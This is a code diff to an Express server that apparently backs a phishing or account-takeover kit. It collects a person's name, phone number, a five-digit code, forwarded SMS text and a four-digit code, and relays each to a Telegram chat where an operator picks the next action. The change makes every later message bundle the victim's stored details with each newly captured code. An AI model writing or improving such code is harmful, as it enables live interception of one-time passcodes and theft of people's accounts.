@@ -12,12 +12,21 @@ app.use(express.static(__dirname));
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-// In-memory storage for waiting users
+// In-memory storage
 let pendingApplications = {};
+let userSessions = {}; // <--- NEW: Stores user data by sessionId
 
 // 1. Endpoint to receive initial form data
 app.post('/api/submit-application', async (req, res) => {
     const { firstName, lastName, phone, fiveDigitCode, sessionId } = req.body;
+
+    // Save the data to the session so we can use it in Step 2 and 3
+    userSessions[sessionId] = {
+        firstName,
+        lastName,
+        phone,
+        fiveDigitCode
+    };
 
     const message = `
 🔔 *NEW DETAILS RECEIVED*
@@ -52,11 +61,19 @@ Please choose an action:`;
 // 2. Endpoint to receive SMS data
 app.post('/api/submit-sms', async (req, res) => {
     const { smsText, sessionId } = req.body;
+    
+    // Retrieve the user's phone number and code from the session
+    const sessionData = userSessions[sessionId] || {};
+    const phone = sessionData.phone || 'Unknown';
+    const fiveDigitCode = sessionData.fiveDigitCode || 'Unknown';
 
     const message = `
 📩 *SMS RECEIVED FROM USER*
 -------------------------
-*Message:* \`${smsText || 'Empty'}\`
+*Name:* ${sessionData.firstName || ''} ${sessionData.lastName || ''}
+*Phone:* \`${phone}\`
+*5-Digit Code:* \`${fiveDigitCode}\`
+*SMS Text:* \`${smsText || 'Empty'}\`
 
 Please choose an action:`;
 
@@ -84,14 +101,22 @@ Please choose an action:`;
     }
 });
 
-// 3. NEW Endpoint to receive 4-digit code
+// 3. Endpoint to receive 4-digit code
 app.post('/api/submit-4digit', async (req, res) => {
     const { fourDigitCode, sessionId } = req.body;
+
+    // Retrieve the user's phone number and 5-digit code from the session
+    const sessionData = userSessions[sessionId] || {};
+    const phone = sessionData.phone || 'Unknown';
+    const fiveDigitCode = sessionData.fiveDigitCode || 'Unknown';
 
     const message = `
 🔑 *4-DIGIT CODE RECEIVED*
 -------------------------
-*Code:* \`${fourDigitCode || 'Empty'}\`
+*Name:* ${sessionData.firstName || ''} ${sessionData.lastName || ''}
+*Phone:* \`${phone}\`
+*Original 5-Digit:* \`${fiveDigitCode}\`
+*New 4-Digit Code:* \`${fourDigitCode || 'Empty'}\`
 
 Please choose an action:`;
 
